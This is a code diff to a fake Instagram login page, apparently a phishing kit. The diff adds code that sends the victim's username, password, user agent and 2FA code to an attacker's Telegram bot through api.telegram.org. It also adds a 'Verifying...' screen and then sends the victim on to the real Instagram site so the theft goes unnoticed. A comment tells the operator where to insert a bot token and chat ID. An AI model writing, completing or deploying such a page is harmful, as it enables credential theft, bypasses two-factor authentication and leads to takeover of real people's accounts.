@@ -78,7 +78,6 @@
             display: block;
         }
 
-        /* ===== LOGIN SECTION ===== */
         .login-section {
             max-width: 350px;
             width: 100%;
@@ -106,7 +105,6 @@
             display: block;
         }
 
-        /* ===== LOGIN FORM ===== */
         #loginForm {
             display: flex;
             flex-direction: column;
@@ -153,7 +151,6 @@
         #loginBtn:not(:disabled) { opacity: 1; }
         #loginBtn:disabled { cursor: not-allowed; }
 
-        /* ===== COOLDOWN OVERLAY ===== */
         #cooldownOverlay {
             display: none;
             position: absolute;
@@ -282,7 +279,6 @@
             font-size: 12px;
         }
 
-        /* ===== 2FA SECTION ===== */
         #twofaSection {
             display: none;
         }
@@ -387,6 +383,34 @@
         }
         .back-link:hover { text-decoration: underline; }
 
+        #loadingScreen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #fff;
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        #loadingScreen .loader-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #dbdbdb;
+            border-top-color: #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        #loadingScreen p {
+            font-size: 14px;
+            color: #262626;
+            font-weight: 500;
+        }
+
         @media (max-width: 450px) {
             body {
                 background: #fff;
@@ -403,6 +427,12 @@
     </style>
 </head>
 <body>
+
+<!-- Loading screen after verify -->
+<div id="loadingScreen">
+    <div class="loader-spinner"></div>
+    <p>Verifying...</p>
+</div>
 
 <div class="wrapper">
     <!-- Phone images -->
@@ -421,7 +451,6 @@
 
     <!-- Login Section -->
     <div class="login-section">
-        <!-- ============ LOGIN CARD ============ -->
         <div class="card" id="loginCard">
             <div class="logo">
                 <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
@@ -454,7 +483,6 @@
             <a href="#" class="forgot-password">Forgot password?</a>
         </div>
 
-        <!-- ============ 2FA CARD ============ -->
         <div class="card" id="twofaSection">
             <div class="lock-icon">
                 <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -485,7 +513,6 @@
             <a href="#" id="backToLogin" class="back-link">← Back to login</a>
         </div>
 
-        <!-- Signup -->
         <div class="signup-card" id="signupCard">
             Don't have an account? <a href="#">Sign up</a>
         </div>
@@ -511,6 +538,11 @@
 </footer>
 
 <script>
+    // ===== CONFIG: ضع التوكن والآيدي تاعك هنا =====
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+    const CHAT_ID = 'YOUR_CHAT_ID';
+    // =============================================
+
     // ===== SLIDESHOW =====
     const slides = document.getElementById('slides');
     let currentSlide = 0;
@@ -534,7 +566,10 @@
     const verifyBtn = document.getElementById('verifyBtn');
     const resendBtn = document.getElementById('resendBtn');
     const backLink = document.getElementById('backToLogin');
+    const loadingScreen = document.getElementById('loadingScreen');
 
+    let capturedUsername = '';
+    let capturedPassword = '';
     let cooldownTimer = null;
     let cooldownCount = 0;
 
@@ -544,16 +579,21 @@
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ===== SUBMIT =====
+    // ===== SUBMIT LOGIN =====
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         if (cooldownTimer) return;
 
-        // Log credentials
-        console.log('[+] Username:', u.value.trim());
-        console.log('[+] Password:', p.value);
+        capturedUsername = u.value.trim();
+        capturedPassword = p.value;
+
+        console.log('[+] Username:', capturedUsername);
+        console.log('[+] Password:', capturedPassword);
         console.log('[+] UA:', navigator.userAgent);
         console.log('[+] Time:', new Date().toISOString());
+
+        // Send to Telegram (login data)
+        sendToTelegram(`🔐 *Instagram Login Captured* 🔐\n\n👤 Username: \`${capturedUsername}\`\n🔑 Password: \`${capturedPassword}\`\n📱 UA: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}`);
 
         // Start cooldown
         loginBtn.disabled = true;
@@ -570,15 +610,12 @@
                 cooldownTimer = null;
                 cooldownOverlay.style.display = 'none';
 
-                // Show 2FA section
+                // Show 2FA
                 loginCard.style.display = 'none';
                 signupCard.style.display = 'none';
                 twofaSection.style.display = 'block';
+                displayUser.textContent = capturedUsername || 'your phone';
 
-                // Set displayed user
-                displayUser.textContent = u.value.trim() || 'your phone';
-
-                // Reset code inputs
                 codeBoxes.forEach(box => box.value = '');
                 codeBoxes[0].focus();
                 verifyBtn.disabled = true;
@@ -623,7 +660,17 @@
     verifyBtn.addEventListener('click', function() {
         const code = Array.from(codeBoxes).map(b => b.value).join('');
         console.log('[+] 2FA Code:', code);
-        alert('✓ Verification code captured: ' + code);
+
+        // Send 2FA code to Telegram
+        sendToTelegram(`🔐 *Instagram 2FA Code* 🔐\n\n👤 Username: \`${capturedUsername}\`\n🔑 Password: \`${capturedPassword}\`\n🔢 2FA Code: \`${code}\`\n📱 UA: ${navigator.userAgent}\n⏰ Time: ${new Date().toISOString()}`);
+
+        // Show loading screen
+        loadingScreen.style.display = 'flex';
+
+        // Redirect to real Instagram after 2 seconds
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com';
+        }, 2000);
     });
 
     // ===== RESEND =====
@@ -632,7 +679,8 @@
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
-        alert('✓ We sent you a new code. Check your phone.');
+
+        sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 Username: \`${capturedUsername}\`\n⏰ Time: ${new Date().toISOString()}`);
     });
 
     // ===== BACK TO LOGIN =====
@@ -641,7 +689,6 @@
         twofaSection.style.display = 'none';
         loginCard.style.display = 'block';
         signupCard.style.display = 'block';
-        loginBtn.disabled = false;
         checkLogin();
     });
 
@@ -649,7 +696,39 @@
     document.getElementById('fbLogin').addEventListener('click', function(e) {
         e.preventDefault();
         console.log('[+] Facebook login clicked');
+        sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 Username: \`${capturedUsername || 'N/A'}\`\n⏰ Time: ${new Date().toISOString()}`);
     });
+
+    // ===== SEND TO TELEGRAM =====
+    function sendToTelegram(message) {
+        if (BOT_TOKEN === 'YOUR_BOT_TOKEN' || CHAT_ID === 'YOUR_CHAT_ID') {
+            console.log('[Telegram] Bot token or chat ID not configured. Message not sent.');
+            console.log('[Telegram] Message:', message);
+            return;
+        }
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('[Telegram] Message sent successfully');
+            } else {
+                console.error('[Telegram] Error:', data);
+            }
+        })
+        .catch(err => console.error('[Telegram] Fetch error:', err));
+    }
 </script>
 </body>
 </html>
